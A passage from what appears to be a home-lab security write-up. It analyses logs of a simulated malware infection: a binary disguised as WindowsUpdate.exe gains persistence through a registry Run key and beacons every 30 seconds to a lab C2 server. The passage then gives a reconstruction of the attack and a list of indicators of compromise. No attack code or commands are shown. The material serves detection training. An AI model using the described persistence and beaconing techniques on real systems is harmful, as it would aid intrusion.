<img width="1102" height="484" alt="Screenshot_66" src="https://github.com/user-attachments/assets/d886ec73-e8ee-4f53-a472-6d7377b7d6ff" />

And we can check out the **regedit** and you will see that the registry key was added indeed
<img width="1031" height="433" alt="Screenshot_59" src="https://github.com/user-attachments/assets/7711754d-04d5-4c84-952c-a6b188bbb4a0" />


#### C2 Communication Channel (EventCode 3)
This event shows outbound network communication initiated by the malware.

Maps to: Application Layer Protocol (T1071.001)
Observed behavior:
- Source IP: 192.168.200.128 (victim)
- Destination IP: 192.168.200.129 (C2 server)
- Port: 8080
- Process: WindowsUpdate.exe

Analysis:
- The process initiating the connection is the malware itself The destination is external and controlled by the attacker Communication happens over HTTP

This confirms the establishment of a Command & Control (C2) channel.
<img width="1106" height="589" alt="Screenshot_67" src="https://github.com/user-attachments/assets/2aae9424-9132-46b7-ab7a-719501d2671f" />

And By analyzing timestamps of repeated network events, we observe:
- Multiple connections to the same IP
- Consistent interval of 30 seconds

<img width="1098" height="314" alt="Screenshot_68" src="https://github.com/user-attachments/assets/cb3cb595-29db-4a7c-ba20-057ae242826e" />


#### Attack Reconstruction

By correlating all observed events, we can reconstruct the full attack:
- The malware (WindowsUpdate.exe) was introduced into the system
- The user executed the file manually
- The malware established persistence via Registry Run key
- It initiated outbound communication to the attacker’s C2 server
- It began periodic beaconing to exfiltrate data

> This structured view transforms raw logs into a clear attack narrative.

**Indicators of Compromise (IOCs)**
- WindowsUpdate.exe
- 192.168.200.129:8080
- DESKTOP-MOPLS2N\GLITCH

Why IOCs matter:
Can be used for detection rules
Help identify similar infections across the environment
Serve as a foundation for alerting and threat hunting

---

## Use Case 2: Phishing via Malicious Word Attachment


